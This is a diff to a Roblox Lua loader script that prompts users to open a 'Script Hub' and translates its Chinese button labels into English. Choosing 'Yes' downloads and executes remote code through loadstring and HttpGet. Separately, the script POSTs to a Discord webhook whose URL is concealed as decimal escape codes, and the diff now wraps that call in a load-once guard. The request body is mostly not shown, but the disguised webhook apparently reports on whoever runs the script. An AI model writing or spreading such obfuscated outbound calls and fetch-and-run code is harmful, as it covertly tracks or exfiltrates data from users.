@@ -4,15 +4,17 @@ game.StarterGui:SetCore("SendNotification", {
         Title = "Recommend for you",
         Text = "Do you wanna open Script Hub?",
         Duration = 5,
-        Button1 = "是",
-        Button2 = "否",
+        Button1 = "Yes",
+        Button2 = "No",
         Callback = NotificationBindable
     })
 NotificationBindable.OnInvoke = function(button)
-    if button == "是" then
+    if button == "Yes" then
         loadstring(game:HttpGet('https://raw.githubusercontent.com/rbxluau/Roblox/main/ScriptHub.lua'))()
     end
 end
+if not _G.AlreadyLoaded then
+_G.AlreadyLoaded = true
 request({
     Url = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\50\51\53\52\53\57\56\50\56\52\50\56\56\51\50\56\51\57\47\114\122\78\101\87\102\99\98\106\83\111\50\81\109\107\90\74\105\118\56\111\120\50\76\45\75\77\51\114\89\88\73\48\54\98\80\112\122\67\119\86\45\85\88\105\49\66\101\89\57\80\105\105\45\55\75\105\48\86\111\102\98\80\45\111\108\77\98",
     Method = "POST",
@@ -24,3 +26,4 @@ request({
         }
     })
 })
+end
